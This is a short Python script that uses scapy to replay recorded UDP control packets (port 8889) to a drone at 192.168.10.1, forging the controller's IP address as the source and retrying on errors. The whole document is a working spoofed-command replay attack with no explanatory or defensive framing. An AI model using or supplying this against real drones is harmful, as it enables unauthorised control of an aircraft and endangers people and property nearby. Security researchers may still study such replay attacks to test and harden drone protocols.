from scapy.all import *
import time

packets = rdpcap("replay_2_src_5_14_10mins.pcap")

udp_packets = []
for pkt in packets:
    if UDP in pkt and pkt[UDP].dport == 8889:
        udp_packets.append(pkt)
print("loading complete")

drone_ip = "192.168.10.1"
controller_ip = "192.168.10.2"

for pkt in udp_packets:
    while True:
        try:
            new_packet = IP(src=controller_ip, dst=drone_ip)/UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport)/pkt[Raw].load
            send(new_packet)
            break  
        except Exception as e:
            print(f"error: {e}.")
            time.sleep(30) 
